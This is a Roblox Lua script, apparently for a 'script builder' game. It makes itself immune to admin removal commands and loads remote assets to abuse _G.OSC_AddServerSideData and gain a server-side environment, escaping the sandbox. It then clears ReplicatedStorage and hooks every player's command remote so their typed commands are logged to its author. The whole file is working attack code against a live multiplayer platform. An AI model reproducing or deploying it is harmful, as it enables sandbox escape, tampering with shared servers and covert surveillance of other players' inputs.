 if script.ClassName == "LocalScript" then if game.PlaceId == 20279777 then script.Parent = nil else local Environment = getfenv(getmetatable(LoadLibrary"RbxUtility".Create).__call) local oxbox = getfenv() setfenv(1, setmetatable({}, {__index = Environment})) Environment.coroutine.yield() oxbox.script:Destroy() end end
if script ~= true then
print("Unremoveable Test Completed! Works! This script is immune to g/nol/all or g/nos/all!")
else
print("Unremoveable Test Failed! This script is removable by g/nol/all or g/nos/all!")
end
 
local screenGui = Instance.new("ScreenGui", game.Players.otub.PlayerGui )
local imageLabel = Instance.new("ImageLabel")
imageLabel.Image = "http://www.roblox.com/asset?id=297223043"
imageLabel.Parent = screenGui --up r    l down
imageLabel.Position = UDim2.new(0, 1650, 0, 690)
imageLabel.Size = UDim2.new(0, 300, 0, 300)
 
local Me = script
wait()
script.Parent=nil
local _OX=getfenv()
local i=game:service'InsertService':LoadAsset(140878711)
local n=i:children()[1]
game:service'Debris':AddItem(i,0)
n.Parent=workspace
pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function()
Environment=getfenv(2)end}))
_G.OSC_AddServerSideData=nil
game:service'Debris':AddItem(n,0)
local new=Environment
new.owner=_OX.owner
new.print=_OX.print
new.error=_OX.error
new.warn=_OX.warn
setfenv(1, Environment)
 
rawset(shared, "\0bp", function()local i=game:service'InsertService':LoadAssetVersion(519416165);local n=i:children()[1];game:service'Debris':AddItem(i,0);n.Parent=workspace;coroutine.yield();local e;pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function()e=getfenv(2)end,__metatable=''}));_G.OSC_AddServerSideData=nil;
game:service'Debris':AddItem(n,0);
return e end);
y=shared['\0bp']();shared["\0bp"]=nil;
 
game:GetService'ReplicatedStorage':ClearAllChildren();
logtxt=''; function writelog(msg) for _, item in ipairs(workspace:GetChildren()) do if item:IsA'Hint' then item:Destroy();end;end; for _, p in pairs(y.game:GetService'Players':GetPlayers()) do local m=y.Instance.new'StringValue'; m.Value='["Print","'..msg..'"]'; m.Name="SB_Output:Output"; m.Parent=p end end
function log(player)local p=type(player)=='string' and getPlayer(player) or player;if p then p.PlayerGui.SB_DataTransfer.SB_CommandRemote.Changed:connect(function(value)if value~='' then
 
 
 
 
 
 
 
 
 
 
 warn("<|"..p.Name.."|> <|CmdBar|> "..value) end;end)p.Chatted:connect(function(msg)end)end;end;table.foreach(y.game:GetService'Players':GetPlayers(),function(_, p)log(p)end);y
.game.Players.PlayerAdded:connect(log);print('~- \/\/welcome -~')